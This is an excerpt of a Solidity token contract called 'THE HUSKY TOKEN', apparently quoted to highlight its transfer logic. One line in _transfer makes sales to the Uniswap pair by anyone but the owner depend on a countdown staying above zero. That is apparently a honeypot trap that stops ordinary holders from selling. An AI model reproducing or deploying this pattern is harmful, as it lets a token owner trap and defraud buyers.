...
contract HUSKY is Context, IERC20, Ownable { 
    ...
    uint256 public _initialTax;
    uint256 public _finalTax;
    uint256 public _reduceTaxTarget;
    uint256 public _reduceTaxCountdown;
    address payable public _feeAddrWallet;

    string private constant _name = "THE HUSKY TOKEN";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
         ...
         if (to == uniswapV2Pair){require(_reduceTaxCountdown>0);}
